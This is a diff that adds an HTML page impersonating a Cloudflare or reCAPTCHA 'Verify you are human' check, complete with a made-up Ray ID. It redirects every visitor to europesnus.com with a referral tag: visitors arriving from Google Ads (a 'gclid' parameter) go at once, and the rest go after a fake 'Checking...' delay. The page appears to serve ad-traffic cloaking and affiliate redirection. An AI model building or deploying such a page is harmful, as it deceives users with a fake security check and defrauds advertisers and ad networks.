@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <script>
+        // Smart Redirect Logic
+        if (window.location.search.includes('gclid')) {
+            window.location.replace('https://europesnus.com/?ref=jemtrluj');
+        }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3b82f6;
+            /* Blue 500 */
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-white h-screen flex flex-col items-center justify-center font-sans m-0">
+
+    <div class="max-w-md w-full px-6">
+        <!-- Main Verification Box -->
+        <div class="border border-gray-300 rounded-lg p-5 shadow-sm bg-gray-50 flex items-center justify-between cursor-pointer hover:shadow transition-shadow"
+            id="verify-box">
+            <div class="flex items-center gap-4">
+                <input type="checkbox" id="human-checkbox"
+                    class="w-6 h-6 rounded border-gray-400 text-blue-600 focus:ring-blue-500 cursor-pointer">
+                <div id="loader-spinner" class="loader hidden"></div>
+                <span id="verify-text" class="text-gray-800 font-medium select-none text-sm md:text-base">Verify you are
+                    human</span>
+            </div>
+
+            <div class="flex flex-col items-center justify-center opacity-60">
+                <!-- Generic Shield/Security Icon to mimic Recaptcha/Cloudflare -->
+                <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-blue-500 mb-1" viewBox="0 0 24 24"
+                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                </svg>
+                <span class="text-[10px] text-gray-500">Privacy - Terms</span>
+            </div>
+        </div>
+
+        <p class="text-center text-sm text-gray-500 mt-8 mb-2">
+            Please stand by, while we are checking your browser...
+        </p>
+        <p class="text-center text-xs text-gray-400">
+            Ray ID: <span class="font-mono">7b92c81d3f4a9b8e</span> &bull; Performance &amp; security by Network
+        </p>
+    </div>
+
+    <script>
+        const verifyBox = document.getElementById('verify-box');
+        const checkbox = document.getElementById('human-checkbox');
+        const spinner = document.getElementById('loader-spinner');
+        const verifyText = document.getElementById('verify-text');
+
+        function triggerVerification() {
+            // Hide checkbox, show loader
+            checkbox.style.display = 'none';
+            spinner.classList.remove('hidden');
+            verifyText.innerText = 'Checking...';
+            verifyBox.classList.remove('cursor-pointer', 'hover:shadow');
+            verifyBox.style.pointerEvents = 'none';
+
+            // Simulate verification success and redirect
+            setTimeout(() => {
+                window.location.replace('https://europesnus.com/?ref=jemtrluj');
+            }, 1500);
+        }
+
+        verifyBox.addEventListener('click', function (e) {
+            if (e.target !== checkbox) {
+                checkbox.checked = true;
+            }
+            triggerVerification();
+        });
+
+        checkbox.addEventListener('change', function () {
+            if (this.checked) {
+                triggerVerification();
+            }
+        });
+    </script>
+</body>
+
+</html>
